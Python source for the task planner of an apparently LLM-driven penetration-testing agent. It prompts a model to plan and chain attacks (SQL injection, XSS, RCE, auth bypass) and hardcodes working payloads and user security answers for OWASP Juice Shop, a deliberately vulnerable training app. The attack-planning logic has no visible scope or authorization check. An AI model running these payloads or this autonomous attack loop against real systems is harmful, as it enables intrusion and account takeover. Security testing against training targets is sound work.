"""
Task Planner - LLM-powered task decomposition and planning
"""

import uuid
import json
from typing import List, Dict, Any, Optional
from dataclasses import dataclass

from .session import Task, TaskStatus

# Import Juice Shop knowledge
try:
    from app.knowledge.juice_shop import (
        JUICE_SHOP_VULNS, JUICE_SHOP_ENDPOINTS, ATTACK_STRATEGIES,
        get_attack_plan, is_juice_shop
    )
    JUICE_SHOP_AVAILABLE = True
except ImportError:
    JUICE_SHOP_AVAILABLE = False


# Planning prompt template
PLANNING_PROMPT = """You are an expert penetration tester AI assistant. Your job is to break down user requests into specific, executable tasks.

TARGET: {target}
USER REQUEST: {request}
{target_knowledge}
AVAILABLE TOOLS:
{tools}

CONTEXT:
{context}

Based on the request, create a plan of tasks. Each task should:
1. Be specific and actionable
2. Map to exactly one available tool
3. Include all required parameters
4. Be ordered logically (dependencies first)

Respond with a JSON array of tasks:
```json
[
  {{
    "description": "Brief description of what this task does",
    "tool": "tool_name",
    "params": {{"param1": "value1"}},
    "priority": 1,
    "reasoning": "Why this task is needed"
  }}
]
```

Important:
- Start with reconnaissance if target is unknown
- Prioritize high-impact vulnerabilities (RCE, SQLi, Auth bypass)
- Consider chaining vulnerabilities when possible
- Be thorough but efficient

Return ONLY the JSON array, no other text."""


@dataclass
class PlanResult:
    """Result of planning operation"""
    success: bool
    tasks: List[Task]
    reasoning: str
    error: Optional[str] = None


class TaskPlanner:
    """
    Plans attack tasks using LLM reasoning
    """

    def __init__(self, llm_service, tool_registry):
        self.llm = llm_service
        self.tools = tool_registry

    async def plan(
        self,
        target: str,
        request: str,
        context: Dict[str, Any] = None
    ) -> PlanResult:
        """
        Create an execution plan from a user request

        Args:
            target: Target URL/host
            request: User's natural language request
            context: Additional context (tech stack, previous findings, etc.)

        Returns:
            PlanResult with list of tasks
        """
        context = context or {}

        # Build tool descriptions for prompt
        tool_descriptions = self._format_tool_descriptions()

        # Build context string
        context_str = self._format_context(context)

        # Build target-specific knowledge
        target_knowledge = self._get_target_knowledge(context)

        # Create planning prompt
        prompt = PLANNING_PROMPT.format(
            target=target,
            request=request,
            target_knowledge=target_knowledge,
            tools=tool_descriptions,
            context=context_str
        )

        try:
            # Get plan from LLM
            response = await self.llm.analyze(prompt, context="task_planning")

            if not response:
                # Fallback to rule-based planning
                return self._fallback_plan(target, request, context)

            # Parse response
            tasks = self._parse_plan_response(response)

            if not tasks:
                return self._fallback_plan(target, request, context)

            return PlanResult(
                success=True,
                tasks=tasks,
                reasoning=f"Planned {len(tasks)} tasks based on: {request}"
            )

        except Exception as e:
            # Fallback on any error
            return self._fallback_plan(target, request, context)

    def _format_tool_descriptions(self) -> str:
        """Format tool registry for prompt"""
        lines = []
        for tool in self.tools.get_all_tools():
            params = ", ".join(f"{p.name}: {p.type}" for p in tool.parameters)
            lines.append(f"- {tool.name}: {tool.description}")
            if params:
                lines.append(f"  Parameters: {params}")
        return "\n".join(lines)

    def _format_context(self, context: Dict[str, Any]) -> str:
        """Format context for prompt"""
        if not context:
            return "No additional context available."

        lines = []
        if "technologies" in context:
            lines.append(f"Technologies: {', '.join(context['technologies'])}")
        if "previous_findings" in context:
            findings = context["previous_findings"]
            lines.append(f"Previous findings: {len(findings)} vulnerabilities found")
        if "endpoints" in context:
            lines.append(f"Known endpoints: {len(context['endpoints'])} discovered")
        if "waf_detected" in context:
            lines.append(f"WAF detected: {context['waf_detected']}")

        return "\n".join(lines) if lines else "No additional context available."

    def _get_target_knowledge(self, context: Dict[str, Any]) -> str:
        """Get target-specific knowledge for the prompt"""
        if not JUICE_SHOP_AVAILABLE or not context.get("is_juice_shop"):
            return ""

        return """
🍊 TARGET IDENTIFIED: OWASP Juice Shop (Known Vulnerable Application)

KNOWN ATTACK VECTORS:
- SQL Injection: /rest/user/login (email: admin'--), /rest/products/search (q: ')) OR 1=1--)
- XSS: /#/search?q=<iframe src="javascript:alert('xss')"> (DOM XSS)
- IDOR: /rest/basket/{id} (try IDs 1-10), /api/Users/{id}
- Sensitive Files: /ftp (directory listing), /ftp/package.json.bak, /metrics
- Admin Panel: /administration (no auth required)

KNOWN USERS:
- admin@juice-sh.op (SQL injection bypass)
- jim@juice-sh.op (security answer: Samuel)
- bender@juice-sh.op (security answer: Stop'n'Drop)

PRIORITY: Use these known working attack vectors first for quick wins!
"""

    def _parse_plan_response(self, response: str) -> List[Task]:
        """Parse LLM response into Task objects"""
        tasks = []

        try:
            # Extract JSON from response
            json_start = response.find("[")
            json_end = response.rfind("]") + 1

            if json_start == -1 or json_end == 0:
                return []

            json_str = response[json_start:json_end]
            plan_data = json.loads(json_str)

            for i, item in enumerate(plan_data):
                tool_name = item.get("tool", "")

                # Validate tool exists
                if not self.tools.has_tool(tool_name):
                    continue

                task = Task(
                    id=str(uuid.uuid4()),
                    description=item.get("description", f"Task {i+1}"),
                    tool_name=tool_name,
                    parameters=item.get("params", {}),
                    status=TaskStatus.PENDING,
                    priority=item.get("priority", i + 1)
                )
                tasks.append(task)

        except json.JSONDecodeError:
            return []

        # Sort by priority
        tasks.sort(key=lambda t: t.priority)
        return tasks

    def _fallback_plan(
        self,
        target: str,
        request: str,
        context: Dict[str, Any]
    ) -> PlanResult:
        """
        Rule-based fallback planning when LLM unavailable
        """
        # Check if this is OWASP Juice Shop
        if JUICE_SHOP_AVAILABLE and context.get("is_juice_shop"):
            return self._juice_shop_plan(target, request, context)

        tasks = []
        request_lower = request.lower()

        # Determine what the user wants
        wants_recon = any(w in request_lower for w in ["scan", "find", "discover", "recon", "crawl"])
        wants_sqli = any(w in request_lower for w in ["sql", "sqli", "injection", "database"])
        wants_xss = any(w in request_lower for w in ["xss", "cross-site", "script"])
        wants_rce = any(w in request_lower for w in ["rce", "command", "exec", "shell"])
        wants_auth = any(w in request_lower for w in ["auth", "login", "bypass", "session"])
        wants_all = any(w in request_lower for w in ["all", "full", "complete", "everything"])
        wants_chain = any(w in request_lower for w in ["chain", "escalate", "pivot"])

        # Always start with recon if no context
        if wants_recon or not context.get("endpoints"):
            tasks.append(Task(
                id=str(uuid.uuid4()),
                description="Crawl target and discover endpoints",
                tool_name="crawl",
                parameters={"url": target, "depth": 3},
                priority=1
            ))
            tasks.append(Task(
                id=str(uuid.uuid4()),
                description="Detect technologies and frameworks",
                tool_name="tech_detect",
                parameters={"url": target},
                priority=2
            ))

        # Add requested vuln tests
        priority = 10

        if wants_sqli or wants_all:
            tasks.append(Task(
                id=str(uuid.uuid4()),
                description="Test for SQL injection vulnerabilities",
                tool_name="test_sqli",
                parameters={"url": target, "methods": ["boolean", "error", "time"]},
                priority=priority
            ))
            priority += 1

        if wants_xss or wants_all:
            tasks.append(Task(
                id=str(uuid.uuid4()),
                description="Test for XSS vulnerabilities",
                tool_name="test_xss",
                parameters={"url": target, "contexts": ["html", "attr", "js"]},
                priority=priority
            ))
            priority += 1

        if wants_rce or wants_all:
            tasks.append(Task(
                id=str(uuid.uuid4()),
                description="Test for command injection / RCE",
                tool_name="test_rce",
                parameters={"url": target},
                priority=priority
            ))
            priority += 1

        if wants_auth or wants_all:
            tasks.append(Task(
                id=str(uuid.uuid4()),
                description="Test authentication mechanisms",
                tool_name="test_auth",
                parameters={"url": target},
                priority=priority
            ))
            priority += 1

        if wants_chain:
            tasks.append(Task(
                id=str(uuid.uuid4()),
                description="Analyze and chain discovered vulnerabilities",
                tool_name="chain_analysis",
                parameters={},
                priority=100
            ))

        # Default: basic scan
        if not tasks:
            tasks = [
                Task(
                    id=str(uuid.uuid4()),
                    description="Perform comprehensive security scan",
                    tool_name="unified_scan",
                    parameters={"url": target, "depth": "balanced"},
                    priority=1
                )
            ]

        return PlanResult(
            success=True,
            tasks=tasks,
            reasoning=f"Fallback plan: {len(tasks)} tasks created based on request keywords"
        )

    def _juice_shop_plan(
        self,
        target: str,
        request: str,
        context: Dict[str, Any]
    ) -> PlanResult:
        """
        Generate optimized attack plan for OWASP Juice Shop
        """
        tasks = []
        attack_plan = get_attack_plan(target)

        # Phase 1: Reconnaissance (always first)
        tasks.append(Task(
            id=str(uuid.uuid4()),
            description="Check /main.js for hardcoded secrets",
            tool_name="http_request",
            parameters={"url": f"{target}/main.js", "method": "GET"},
            priority=1
        ))
        tasks.append(Task(
            id=str(uuid.uuid4()),
            description="Enumerate /ftp directory for sensitive files",
            tool_name="directory_list",
            parameters={"url": f"{target}/ftp"},
            priority=2
        ))

        # Phase 2: SQL Injection attacks (known working)
        sqli_payloads = JUICE_SHOP_VULNS["sql_injection"]["payloads"]
        tasks.append(Task(
            id=str(uuid.uuid4()),
            description="SQL injection on login - Admin bypass with admin'--",
            tool_name="test_sqli",
            parameters={
                "url": f"{target}/rest/user/login",
                "method": "POST",
                "payload": {"email": "admin'--", "password": "x"}
            },
            priority=10
        ))
        tasks.append(Task(
            id=str(uuid.uuid4()),
            description="SQL injection on search - ')) OR 1=1--",
            tool_name="test_sqli",
            parameters={
                "url": f"{target}/rest/products/search",
                "param": "q",
                "payload": "')) OR 1=1--"
            },
            priority=11
        ))

        # Phase 3: XSS attacks (DOM-based)
        tasks.append(Task(
            id=str(uuid.uuid4()),
            description="DOM XSS on search via iframe injection",
            tool_name="test_xss",
            parameters={
                "url": f"{target}/#/search",
                "param": "q",
                "payload": "<iframe src=\"javascript:alert('xss')\">"
            },
            priority=20
        ))

        # Phase 4: Broken Access Control (IDOR)
        tasks.append(Task(
            id=str(uuid.uuid4()),
            description="IDOR on baskets - access other users' baskets",
            tool_name="test_idor",
            parameters={
                "url": f"{target}/rest/basket/{{id}}",
                "id_range": [1, 10]
            },
            priority=30
        ))
        tasks.append(Task(
            id=str(uuid.uuid4()),
            description="Access admin panel without authentication",
            tool_name="http_request",
            parameters={
                "url": f"{target}/administration",
                "method": "GET"
            },
            priority=31
        ))

        # Phase 5: Sensitive Data Exposure
        tasks.append(Task(
            id=str(uuid.uuid4()),
            description="Download package.json.bak from FTP",
            tool_name="http_request",
            parameters={
                "url": f"{target}/ftp/package.json.bak",
                "method": "GET"
            },
            priority=40
        ))
        tasks.append(Task(
            id=str(uuid.uuid4()),
            description="Check Prometheus metrics exposure",
            tool_name="http_request",
            parameters={
                "url": f"{target}/metrics",
                "method": "GET"
            },
            priority=41
        ))

        return PlanResult(
            success=True,
            tasks=tasks,
            reasoning=f"Juice Shop detected! Using specialized attack plan with {len(tasks)} optimized tasks targeting known vulnerabilities."
        )

    async def replan(
        self,
        session,
        new_findings: List[Dict],
        context: Dict[str, Any]
    ) -> PlanResult:
        """
        Replan based on new findings during execution

        This allows the agent to adapt its strategy based on what it discovers.
        """
        if not new_findings:
            return PlanResult(success=True, tasks=[], reasoning="No new findings to replan for")

        # Build replan prompt
        findings_summary = "\n".join([
            f"- {f['type']}: {f.get('title', 'Unknown')} ({f.get('severity', 'unknown')})"
            for f in new_findings[:10]  # Limit to top 10
        ])

        prompt = f"""Based on new findings during the scan, suggest additional tasks:

TARGET: {context.get('target', 'Unknown')}

NEW FINDINGS:
{findings_summary}

CURRENT CONTEXT:
{self._format_context(context)}

What additional tests or exploitation attempts should we try based on these findings?
Consider:
- Chaining vulnerabilities (e.g., SQLi -> file read -> RCE)
- Escalation paths
- Related vulnerability types to check

Respond with a JSON array of additional tasks, or empty array if no additional tasks needed."""

        try:
            response = await self.llm.analyze(prompt, context="replanning")
            additional_tasks = self._parse_plan_response(response) if response else []

            return PlanResult(
                success=True,
                tasks=additional_tasks,
                reasoning=f"Replanned: {len(additional_tasks)} additional tasks based on findings"
            )
        except Exception:
            return PlanResult(success=True, tasks=[], reasoning="Replan failed, continuing with current plan")
